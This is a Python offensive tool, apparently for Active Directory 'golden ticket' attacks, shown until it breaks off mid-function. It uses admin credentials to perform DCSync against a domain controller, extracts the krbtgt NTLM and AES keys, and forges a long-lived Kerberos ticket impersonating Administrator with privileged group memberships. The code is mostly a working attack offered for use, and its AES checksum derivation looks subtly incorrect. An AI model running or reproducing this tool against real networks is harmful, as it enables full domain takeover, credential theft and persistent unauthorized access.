#!/usr/bin/env python3

import sys
import os
import re
import logging
import datetime
import random
import calendar
from calendar import timegm
from binascii import unhexlify, hexlify

from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

from impacket.dcerpc.v5.dtypes import RPC_SID, SID
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
    SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
from impacket.krb5.asn1 import AS_REP, AuthorizationData, EncTicketPart, EncASRepPart, AD_IF_RELEVANT
from impacket.krb5.constants import ApplicationTagNumbers, EncryptionTypes, \
    PrincipalNameType, ProtocolVersionNumber, TicketFlags, encodeFlags, ChecksumTypes, AuthorizationDataType, \
    KERB_NON_KERB_CKSUM_SALT
from impacket.krb5.crypto import Key, _enctype_table, _checksum_table, Enctype, _AES256CTS, _AES128CTS
from impacket.krb5.pac import PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PACTYPE, \
    VALIDATION_INFO, PAC_CLIENT_INFO, KERB_VALIDATION_INFO, PAC_ATTRIBUTES_INFO, \
    PAC_REQUESTOR_INFO, PAC_REQUESTOR, PAC_ATTRIBUTE_INFO
from impacket.krb5.types import KerberosTime
from impacket.krb5.ccache import CCache
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.dcerpc.v5 import transport, lsad
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED

from ldap3 import Server, Connection, ALL, NTLM
from ldap3.core.exceptions import LDAPBindError
from colorama import Fore, Style, init

init(autoreset=True)
logging.getLogger().setLevel(logging.ERROR)


def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════╗
    ║         Golden Ticket Attack              ║
    ║           Exploit Kerbtgt                 ║
    ╚═══════════════════════════════════════════╝
    """)


def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))


def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


def resolve_ticket_path(user_input, default_name):
    if not user_input:
        return os.path.join(os.getcwd(), default_name), None
    
    cleaned = user_input.strip()
    trailing_sep = cleaned.endswith('/') or cleaned.endswith('\\')
    
    if os.path.isabs(cleaned):
        full_path = os.path.normpath(cleaned)
    else:
        full_path = os.path.normpath(os.path.join(os.getcwd(), cleaned))
    
    if trailing_sep:
        os.makedirs(full_path, exist_ok=True)
        return os.path.join(full_path, default_name), None
    
    base = os.path.basename(full_path)
    if '.' not in base:
        os.makedirs(full_path, exist_ok=True)
        return os.path.join(full_path, default_name), None
    
    ext = os.path.splitext(base)[1].lower()
    if ext != '.ccache':
        return None, f"[!] Invalid file format '{ext}' — only .ccache is accepted."
    
    directory = os.path.dirname(full_path)
    if directory:
        os.makedirs(directory, exist_ok=True)
    
    return full_path, None


def check_ip_reachable(dc_ip):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn = Connection(server)
        conn.open()
        conn.unbind()
        return True
    except Exception:
        return False


def check_credentials_and_domain(dc_ip, domain, username, password):
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            auto_bind=True
        )
        conn.search(
            search_base=base_dn,
            search_filter='(objectClass=domain)',
            search_scope='SUBTREE',
            attributes=['dc']
        )
        result = len(conn.entries) > 0
        conn.unbind()
        return result
    except LDAPBindError:
        return "invalid_credentials"
    except Exception:
        return False


def check_admin_privileges(dc_ip, domain, username, password):
    try:
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain, '', '')
        tid = smb.connectTree('C$')
        smb.disconnectTree(tid)
        smb.logoff()
        return True
    except Exception as e:
        error = str(e)
        if 'STATUS_ACCESS_DENIED' in error:
            return "access_denied"
        elif 'STATUS_LOGON_FAILURE' in error:
            return "invalid_credentials"
        return f"error: {error}"


class KrbtgtDumper:
    def __init__(self, dc_ip, domain, username, password):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.krbtgt_hash = None
        self.domain_sid = None
        self.krbtgt_aes256_key = None
        self.krbtgt_aes128_key = None

    def get_domain_sid(self):
        try:
            string_binding = f'ncacn_np:{self.dc_ip}[\\pipe\\lsarpc]'
            trans = transport.DCERPCTransportFactory(string_binding)
            trans.set_credentials(self.username, self.password, self.domain, '', '')
            dce = trans.get_dce_rpc()
            dce.connect()
            dce.bind(lsad.MSRPC_UUID_LSAD)
            resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsad.POLICY_LOOKUP_NAMES)
            policy_hd = resp['PolicyHandle']
            resp = lsad.hLsarQueryInformationPolicy2(
                dce, policy_hd,
                lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation
            )
            sid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
            dce.disconnect()
            return sid
        except Exception:
            return None

    def dump(self):
        print(Fore.YELLOW + "[*] Connecting via SMB..." + Style.RESET_ALL)
        try:
            smb = SMBConnection(self.dc_ip, self.dc_ip)
            smb.login(self.username, self.password, self.domain, '', '')
            print(Fore.GREEN + "[+] SMB connected!" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] SMB connection failed: {e}" + Style.RESET_ALL)
            return False

        try:
            remote_ops = RemoteOperations(smb, False, self.dc_ip, None)
            remote_ops.setExecMethod('smbexec')
        except Exception as e:
            print(Fore.RED + f"[-] RemoteOperations failed: {e}" + Style.RESET_ALL)
            return False

        print(Fore.YELLOW + "[*] Extracting krbtgt..." + Style.RESET_ALL)

        captured = []
        orig_stdout = sys.stdout

        class Capture:
            def write(self, text):
                if text.strip():
                    captured.append(text.strip())
                orig_stdout.write(text)
            def flush(self):
                orig_stdout.flush()

        sys.stdout = Capture()
        try:
            ntds = NTDSHashes(
                None, None,
                isRemote=True,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=False,
                justNTLM=False,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=None,
                justUser='krbtgt',
                skipUser=None,
                ldapFilter=None,
                printUserStatus=False
            )
            ntds.dump()
        except Exception as e:
            sys.stdout = orig_stdout
            print(Fore.RED + f"[-] DCSync failed: {e}" + Style.RESET_ALL)
            return False
        finally:
            sys.stdout = orig_stdout

        for line in captured:
            # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ntlm_hash:::
            m = re.search(r'krbtgt.*?(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', line, re.IGNORECASE)
            if m:
                self.krbtgt_hash = m.group(3)
            

            aes256_match = re.search(r'krbtgt.*?aes256-cts-hmac-sha1-96\s+([a-fA-F0-9]{64})', line, re.IGNORECASE)
            if aes256_match:
                self.krbtgt_aes256_key = aes256_match.group(1)
            
            aes128_match = re.search(r'krbtgt.*?aes128-cts-hmac-sha1-96\s+([a-fA-F0-9]{32})', line, re.IGNORECASE)
            if aes128_match:
                self.krbtgt_aes128_key = aes128_match.group(1)

        if self.krbtgt_hash:
            print(Fore.GREEN + f"[+] krbtgt NTLM hash extracted!" + Style.RESET_ALL)
        if self.krbtgt_aes256_key:
            print(Fore.GREEN + f"[+] krbtgt AES256 key extracted!" + Style.RESET_ALL)
        if self.krbtgt_aes128_key:
            print(Fore.GREEN + f"[+] krbtgt AES128 key extracted!" + Style.RESET_ALL)
        
        self.domain_sid = self.get_domain_sid()
        if self.domain_sid:
            print(Fore.GREEN + f"[+] Domain SID: {self.domain_sid}" + Style.RESET_ALL)
        
        return self.krbtgt_hash is not None


class ModernGoldenTicketMaker:
    """Golden Ticket Maker with Correct AES Checksum Support"""
    
    @staticmethod
    def getFileTime(t):
        t *= 10000000
        t += 116444736000000000
        return t

    @staticmethod
    def getPadLength(data_length):
        return ((data_length + 7) // 8 * 8) - data_length

    @staticmethod
    def getBlockLength(data_length):
        return (data_length + 7) // 8 * 8

    def derive_aes_checksum_key(self, base_key, usage):

        if base_key.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            # For AES256, derive key using the usage
            key_bytes = base_key.contents
            # HMAC-SHA1-96-AEAD key derivation
            from Crypto.Hash import HMAC, SHA1
            usage_bytes = usage.to_bytes(4, byteorder='little')
            hmac = HMAC.new(key_bytes, digestmod=SHA1)
            hmac.update(b"checksumkey")
            hmac.update(usage_bytes)
            derived = hmac.digest()[:16]  # First 16 bytes for HMAC key
            return Key(base_key.enctype, derived)
        elif base_key.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            key_bytes = base_key.contents
            from Crypto.Hash import HMAC, SHA1
            usage_bytes = usage.to_bytes(4, byteorder='little')
            hmac = HMAC.new(key_bytes, digestmod=SHA1)
            hmac.update(b"checksumkey")
            hmac.update(usage_bytes)
            derived = hmac.digest()[:16]
            return Key(base_key.enctype, derived)
        return base_key

    def create_validation_info(self, domain, domain_sid, target_user, user_id, groups, extra_sid=None):
        kerbdata = KERB_VALIDATION_INFO()

        aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
        unixTime = self.getFileTime(aTime)

        kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32
        kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF
        kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF
        kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32
        kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
        kerbdata['PasswordCanChange']['dwHighDateTime'] = 0
        kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['EffectiveName'] = target_user
        kerbdata['FullName'] = ''
        kerbdata['LogonScript'] = ''
        kerbdata['ProfilePath'] = ''
        kerbdata['HomeDirectory'] = ''
        kerbdata['HomeDirectoryDrive'] = ''
        kerbdata['LogonCount'] = 500
        kerbdata['BadPasswordCount'] = 0
        kerbdata['UserId'] = int(user_id)

        groups_list = [g.strip() for g in groups.split(',')]
        kerbdata['PrimaryGroupId'] = int(groups_list[0]) if groups_list else 513
        kerbdata['GroupCount'] = len(groups_list)

        for group in groups_list:
            groupMembership = GROUP_MEMBERSHIP()
            groupId = NDRULONG()
            groupId['Data'] = int(group)
            groupMembership['RelativeId'] = groupId
            groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['GroupIds'].append(groupMembership)

        kerbdata['UserFlags'] = 0
        kerbdata['UserSessionKey'] = b'\x00' * 16
        kerbdata['LogonServer'] = ''
        kerbdata['LogonDomainName'] = domain.upper()
        kerbdata['LogonDomainId'].fromCanonical(domain_sid)
        kerbdata['LMKey'] = b'\x00' * 8
        kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata['SubAuthStatus'] = 0
        kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
        kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
        kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
        kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
        kerbdata['FailedILogonCount'] = 0
        kerbdata['Reserved3'] = 0
        kerbdata['ResourceGroupDomainSid'] = NULL
        kerbdata['ResourceGroupCount'] = 0
        kerbdata['ResourceGroupIds'] = NULL
        
        if extra_sid:
            from impacket.krb5.pac import PKERB_SID_AND_ATTRIBUTES_ARRAY, KERB_SID_AND_ATTRIBUTES
            extrasids = extra_sid.split(',')
            kerbdata['UserFlags'] |= 0x20
            kerbdata['SidCount'] = len(extrasids)
            kerbdata['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
            for extrasid in extrasids:
                sidRecord = KERB_SID_AND_ATTRIBUTES()
                sid = RPC_SID()
                sid.fromCanonical(extrasid)
                sidRecord['Sid'] = sid
                sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
                kerbdata['ExtraSids'].append(sidRecord)
        else:
            kerbdata['ExtraSids'] = NULL

        validationInfo = VALIDATION_INFO()
        validationInfo['Data'] = kerbdata
        return validationInfo

    def create_requestor_info_pac(self, domain_sid, user_id):
        pacRequestor = PAC_REQUESTOR()
        pacRequestor['UserSid'] = SID()
        pacRequestor['UserSid'].fromCanonical(f"{domain_sid}-{user_id}")
        return pacRequestor.getData()

    def create_attributes_info_pac(self):
        pacAttributes = PAC_ATTRIBUTE_INFO()
        pacAttributes["FlagsLength"] = 2
        pacAttributes["Flags"] = 1
        return pacAttributes.getData()

    def compute_pac_checksums(self, pac_type_data, key, checksum_type, is_server=True):
   
        csf = _checksum_table[checksum_type]
        
        if checksum_type == ChecksumTypes.hmac_md5.value:

            return csf.checksum(key, KERB_NON_KERB_CKSUM_SALT, pac_type_data)
        else:
            # AES:需要用 Key Derivation (usage 17 for server, 16 for priv)
            usage = 17 if is_server else 16
            derived_key = self.derive_aes_checksum_key(key, usage)
            return csf.checksum(derived_key, KERB_NON_KERB_CKSUM_SALT, pac_type_data)

    def create_golden_ticket(self, domain, krbtgt_hash, domain_sid, target_user, 
                             output_path, user_id='500', groups='513,512,520,518,519', 
                             extra_sid=None, aes_key=None, duration_hours=87600):
 
        try:
            print(Fore.YELLOW + f"[*] Forging Golden Ticket for: {target_user}" + Style.RESET_ALL)
            

            if aes_key:
                if len(aes_key) == 64:
                    enc_type = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                    checksum_type = ChecksumTypes.hmac_sha1_96_aes256.value
                    key_data = aes_key
                    print(Fore.YELLOW + "[*] Using AES256 encryption with derived keys" + Style.RESET_ALL)
                elif len(aes_key) == 32:
                    enc_type = EncryptionTypes.aes128_cts_hmac_sha1_96.value
                    checksum_type = ChecksumTypes.hmac_sha1_96_aes128.value
                    key_data = aes_key
                    print(Fore.YELLOW + "[*] Using AES128 encryption with derived keys" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "[-] Invalid AES key length!" + Style.RESET_ALL)
                    return None
            else:
                enc_type = EncryptionTypes.rc4_hmac.value
                checksum_type = ChecksumTypes.hmac_md5.value
                key_data = krbtgt_hash
                print(Fore.YELLOW + "[*] Using RC4 encryption" + Style.RESET_ALL)
            
            krbtgt_key = Key(enc_type, unhexlify(key_data))
            

            kdcRep = AS_REP()
            kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value
            kdcRep['pvno'] = 5
            kdcRep['crealm'] = domain.upper()
            kdcRep['cname'] = noValue
            kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            kdcRep['cname']['name-string'] = noValue
            kdcRep['cname']['name-string'][0] = target_user
            

            kdcRep['ticket'] = noValue
            kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value
            kdcRep['ticket']['realm'] = domain.upper()
            kdcRep['ticket']['sname'] = noValue
            kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
            kdcRep['ticket']['sname']['name-string'] = noValue
            kdcRep['ticket']['sname']['name-string'][0] = 'krbtgt'
            kdcRep['ticket']['sname']['name-string'][1] = domain.upper()
            kdcRep['ticket']['enc-part'] = noValue
            kdcRep['ticket']['enc-part']['etype'] = enc_type
            kdcRep['ticket']['enc-part']['kvno'] = 2
            
            kdcRep['enc-part'] = noValue
            kdcRep['enc-part']['etype'] = enc_type
            kdcRep['enc-part']['kvno'] = 2
            

            validationInfo = self.create_validation_info(
                domain, domain_sid, target_user, user_id, groups, extra_sid
            )
            
            pacInfos = {}
            
            # 1. PAC_LOGON_INFO
            pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()
            
            # 2. PAC_CLIENT_INFO_TYPE
            clientInfo = PAC_CLIENT_INFO()
            clientInfo['Name'] = target_user.encode('utf-16le')
            clientInfo['NameLength'] = len(clientInfo['Name'])
            aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
            clientInfo['ClientId'] = self.getFileTime(aTime)
            pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()
            
            # 3. PAC_ATTRIBUTES_INFO
            pacInfos[PAC_ATTRIBUTES_INFO] = self.create_attributes_info_pac()
            
            # 4. PAC_REQUESTOR_INFO
            pacInfos[PAC_REQUESTOR_INFO] = self.create_requestor_info_pac(domain_sid, user_id)
            

            srvCheckSum = PAC_SIGNATURE_DATA()
            srvCheckSum['SignatureType'] = checksum_type
            if checksum_type == ChecksumTypes.hmac_md5.value:
                srvCheckSum['Signature'] = b'\x00' * 16
            else:
                srvCheckSum['Signature'] = b'\x00' * 12
            pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()
            

            privCheckSum = PAC_SIGNATURE_DATA()
            privCheckSum['SignatureType'] = checksum_type
            if checksum_type == ChecksumTypes.hmac_md5.value:
                privCheckSum['Signature'] = b'\x00' * 16
            else:
                privCheckSum['Signature'] = b'\x00' * 12
            pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()
            
            # EncTicketPart
            encTicketPart = EncTicketPart()
            
            flags = [
                TicketFlags.forwardable.value,
                TicketFlags.proxiable.value,
                TicketFlags.renewable.value,
                TicketFlags.initial.value,
                TicketFlags.pre_authent.value,
            ]
            encTicketPart['flags'] = encodeFlags(flags)
            
            session_key_data = os.urandom(32 if enc_type != EncryptionTypes.rc4_hmac.value else 16)
            encTicketPart['key'] = noValue
            encTicketPart['key']['keytype'] = enc_type
            encTicketPart['key']['keyvalue'] = session_key_data
            
            encTicketPart['crealm'] = domain.upper()
            encTicketPart['cname'] = noValue
            encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            encTicketPart['cname']['name-string'] = noValue
            encTicketPart['cname']['name-string'][0] = target_user
            
            encTicketPart['transited'] = noValue
            encTicketPart['transited']['tr-type'] = 0
            encTicketPart['transited']['contents'] = ''
            
            now = datetime.datetime.now(datetime.timezone.utc)
            end = now + datetime.timedelta(hours=int(duration_hours))
            renew = now + datetime.timedelta(hours=int(duration_hours))
            
            encTicketPart['authtime'] = KerberosTime.to_asn1(now)
            encTicketPart['starttime'] = KerberosTime.to_asn1(now)
            encTicketPart['endtime'] = KerberosTime.to_asn1(end)
            encTicketPart['renew-till'] = KerberosTime.to_asn1(renew)
            
            pac_count = len(pacInfos)
            

            validation_blob = pacInfos[PAC_LOGON_INFO]
            validation_pad = b'\x00' * self.getPadLength(len(validation_blob))
            
            client_blob = pacInfos[PAC_CLIENT_INFO_TYPE]
            client_pad = b'\x00' * self.getPadLength(len(client_blob))
            
            attr_blob = pacInfos[PAC_ATTRIBUTES_INFO]
            attr_pad = b'\x00' * self.getPadLength(len(attr_blob))
            
            req_blob = pacInfos[PAC_REQUESTOR_INFO]
            req_pad = b'\x00' * self.getPadLength(len(req_blob))
            
            server_blob = pacInfos[PAC_SERVER_CHECKSUM]
            server_pad = b'\x00' * self.getPadLength(len(server_blob))
            
            priv_blob = pacInfos[PAC_PRIVSVR_CHECKSUM]
            priv_pad = b'\x00' * self.getPadLength(len(priv_blob))
            
            server_checksum = PAC_SIGNATURE_DATA(server_blob)
            priv_checksum = PAC_SIGNATURE_DATA(priv_blob)
            

            offset = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count
            

            vib = PAC_INFO_BUFFER()
            vib['ulType'] = PAC_LOGON_INFO
            vib['cbBufferSize'] = len(validation_blob)
            vib['Offset'] = offset
            offset = self.getBlockLength(offset + vib['cbBufferSize'])
            
            cib = PAC_INFO_BUFFER()
            cib['ulType'] = PAC_CLIENT_INFO_TYPE
            cib['cbBufferSize'] = len(client_blob)
            cib['Offset'] = offset
            offset = self.getBlockLength(offset + cib['cbBufferSize'])
            
            aib = PAC_INFO_BUFFER()
            aib['ulType'] = PAC_ATTRIBUTES_INFO
            aib['cbBufferSize'] = len(attr_blob)
            aib['Offset'] = offset
            offset = self.getBlockLength(offset + aib['cbBufferSize'])
            
            rib = PAC_INFO_BUFFER()
            rib['ulType'] = PAC_REQUESTOR_INFO
            rib['cbBufferSize'] = len(req_blob)
            rib['Offset'] = offset
            offset = self.getBlockLength(offset + rib['cbBufferSize'])
            
            sib = PAC_INFO_BUFFER()
            sib['ulType'] = PAC_SERVER_CHECKSUM
            sib['cbBufferSize'] = len(server_blob)
            sib['Offset'] = offset
            offset = self.getBlockLength(offset + sib['cbBufferSize'])
            
            pib = PAC_INFO_BUFFER()
            pib['ulType'] = PAC_PRIVSVR_CHECKSUM
            pib['cbBufferSize'] = len(priv_blob)
            pib['Offset'] = offset
            

            buffers = (vib.getData() + cib.getData() + aib.getData() + 
                      rib.getData() + sib.getData() + pib.getData() +
                      validation_blob + validation_pad +
                      client_blob + client_pad +
                      attr_blob + attr_pad +
                      req_blob + req_pad)
            buffers_tail = server_blob + server_pad + priv_blob + priv_pad
            
            pac_type = PACTYPE()
            pac_type['cBuffers'] = pac_count
            pac_type['Version'] = 0
            pac_type['Buffers'] = buffers + buffers_tail
            

            blob_to_checksum = pac_type.getData()
            
            # Server Checksum
            server_sig = self.compute_pac_checksums(blob_to_checksum, krbtgt_key, checksum_type, is_server=True)
            server_checksum['Signature'] = server_sig
            

            priv_sig = self.compute_pac_checksums(server_sig, krbtgt_key, checksum_type, is_server=False)
            priv_checksum['Signature'] = priv_sig
            

            buffers_tail = server_checksum.getData() + server_pad + priv_checksum.getData() + priv_pad
            pac_type['Buffers'] = buffers + buffers_tail
            
            # Authorization Data
            authorizationData = AuthorizationData()
            authorizationData[0] = noValue
            authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value
            authorizationData[0]['ad-data'] = pac_type.getData()
            
            encTicketPart['authorization-data'] = noValue
            encTicketPart['authorization-data'][0] = noValue
            encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value
            encTicketPart['authorization-data'][0]['ad-data'] = encoder.encode(authorizationData)
            

            encoded_enc_ticket = encoder.encode(encTicketPart)
            cipher = _enctype_table[enc_type]
            cipherText = cipher.encrypt(krbtgt_key, 2, encoded_enc_ticket, None)
            kdcRep['ticket']['enc-part']['cipher'] = cipherText
            
            # EncASRepPart
            encRepPart = EncASRepPart()
            encRepPart['key'] = noValue
            encRepPart['key']['keytype'] = enc_type
            encRepPart['key']['keyvalue'] = session_key_data
            encRepPart['last-req'] = noValue
            encRepPart['last-req'][0] = noValue
            encRepPart['last-req'][0]['lr-type'] = 0
            encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(now)
            encRepPart['nonce'] = random.randint(1, 0x7fffffff)
            encRepPart['key-expiration'] = KerberosTime.to_asn1(renew)
            encRepPart['flags'] = encodeFlags(flags)
            encRepPart['authtime'] = KerberosTime.to_asn1(now)
            encRepPart['starttime'] = KerberosTime.to_asn1(now)
            encRepPart['endtime'] = KerberosTime.to_asn1(end)
            encRepPart['renew-till'] = KerberosTime.to_asn1(renew)
            encRepPart['srealm'] = domain.upper()
            encRepPart['sname'] = noValue
            encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
            encRepPart['sname']['name-string'] = noValue
            encRepPart['sname']['name-string'][0] = 'krbtgt'
            encRepPart['sname']['name-string'][1] = domain.upper()
            

            session_key_obj = Key(enc_type, session_key_data)
            encoded_enc_rep = encoder.encode(encRepPart)
            enc_rep_cipherText = cipher.encrypt(session_key_obj, 3, encoded_enc_rep, None)
            kdcRep['enc-part']['cipher'] = enc_rep_cipherText
            

            encoded_kdc_rep = encoder.encode(kdcRep)
            ccache = CCache()
            ccache.fromTGT(encoded_kdc_rep, session_key_obj, session_key_obj)
            
            output = output_path if output_path.endswith('.ccache') else f"{output_path}.ccache"
            ccache.saveFile(output)
            
            if os.path.exists(output):
                print(Fore.GREEN + f"[+] Golden Ticket saved: {output}" + Style.RESET_ALL)
                print(Fore.GREEN + f"[+] File size: {os.path.getsize(output)} bytes" + Style.RESET_ALL)
                

                print(Fore.YELLOW + "\n[*] Ticket verification:" + Style.RESET_ALL)
                os.system(f"klist -c {output} 2>/dev/null || echo '  (klist not available)'")
                
                return output
            
            return None
            
        except Exception as e:
            print(Fore.RED + f"[-] Ticket creation failed: {e}" + Style.RESET_ALL)
            import traceback
            traceback.print_exc()
            return None


def main():
    banner()
    
    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address: " + Style.RESET_ALL,
        validate_ip, "Invalid IP!"
    )
    
    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)
    
    domain = get_input(Fore.CYAN + "[?] Domain Name: " + Style.RESET_ALL, validate_domain, "Invalid domain!")
    username = get_input(Fore.CYAN + "[?] Username: " + Style.RESET_ALL)
    password = get_input(Fore.CYAN + "[?] Password: " + Style.RESET_ALL)
    
    print(Fore.YELLOW + "[*] Verifying credentials..." + Style.RESET_ALL)
    result = check_credentials_and_domain(dc_ip, domain, username, password)
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
    
    print(Fore.YELLOW + "[*] Checking admin privileges..." + Style.RESET_ALL)
    priv = check_admin_privileges(dc_ip, domain, username, password)
    if priv != True:
        print(Fore.RED + f"[!] No admin privileges: {priv}" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Admin privileges confirmed!" + Style.RESET_ALL)
    
    print(Fore.YELLOW + "\n[*] Extracting krbtgt keys..." + Style.RESET_ALL)
    dumper = KrbtgtDumper(dc_ip, domain, username, password)
    if not dumper.dump():
        print(Fore.RED + "[-] Failed to extract krbtgt!" + Style.RESET_ALL)
        sys.exit(1)
    
    domain_sid = dumper.domain_sid
    if not domain_sid:
        domain_sid = get_input(Fore.CYAN + "[?] Enter Domain SID manually: " + Style.RESET_ALL)
    
    print(Fore.YELLOW + "\n[*] Ticket Configuration:" + Style.RESET_ALL)
    ticket_user = get_input(Fore.CYAN + "[?] Username to impersonate (default: Administrator): " + Style.RESET_ALL, allow_empty=True) or "Administrator"
    
    extra_sid = None
    if ticket_user.lower() != "administrator":
        extra_sid = get_input(Fore.CYAN + "[?] Extra SID (e.g., S-1-5-21-xxx-512): " + Style.RESET_ALL, allow_empty=True)
    
    user_id = get_input(Fore.CYAN + "[?] User RID (default: 500): " + Style.RESET_ALL, allow_empty=True) or "500"
    groups = get_input(Fore.CYAN + "[?] Groups (default: 513,512,520,518,519): " + Style.RESET_ALL, allow_empty=True) or "513,512,520,518,519"
    

    print(Fore.YELLOW + "\n[*] Encryption options:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. RC4 (NTLM hash) - Legacy, may not work on modern DCs" + Style.RESET_ALL)
    print(Fore.WHITE + "    2. AES128 (if available)" + Style.RESET_ALL)
    print(Fore.WHITE + "    3. AES256 (if available) - Recommended for modern DCs" + Style.RESET_ALL)
    
    enc_choice = get_input(Fore.CYAN + "[?] Choose encryption (default: 1): " + Style.RESET_ALL, allow_empty=True) or "1"
    
    aes_key = None
    if enc_choice == "2":
        aes_key = dumper.krbtgt_aes128_key
        if not aes_key:
            print(Fore.RED + "[!] AES128 key not available! Using RC4..." + Style.RESET_ALL)
            aes_key = None
    elif enc_choice == "3":
        aes_key = dumper.krbtgt_aes256_key
        if not aes_key:
            print(Fore.RED + "[!] AES256 key not available! Using RC4..." + Style.RESET_ALL)
            aes_key = None
    
    while True:
        print(Fore.CYAN + f"[?] Output path (default: {ticket_user}.ccache): " + Style.RESET_ALL, end='')
        out_input = input().strip()
        ticket_path, err = resolve_ticket_path(out_input, f"{ticket_user}.ccache")
        if err:
            print(Fore.RED + err + Style.RESET_ALL)
            continue
        break
    
    print(Fore.YELLOW + "\n[*] Creating Golden Ticket with modern PAC support..." + Style.RESET_ALL)
    print(Fore.YELLOW + "[*] - Added PAC_REQUESTOR_INFO" + Style.RESET_ALL)
    print(Fore.YELLOW + "[*] - Added PAC_ATTRIBUTES_INFO" + Style.RESET_ALL)
    if aes_key:
